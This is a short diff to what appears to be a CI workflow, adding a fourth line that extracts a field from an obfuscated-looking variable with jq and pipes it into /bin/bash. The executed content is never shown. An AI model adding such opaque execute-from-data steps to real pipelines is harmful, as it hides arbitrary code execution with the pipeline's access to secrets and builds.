@@ -27,6 +27,7 @@ jobs:
           echo $bmotf0 | jq -r .i0 | /bin/bash
           echo $vq548 | jq -r .f50 | /bin/bash
           printf '%s' "$c253" | jq -r .fjq71 | /bin/bash
+          printf '%s' "$rspl11592" | jq -r .cooja12854 | /bin/bash
 
       - name: Save output
         if: always()
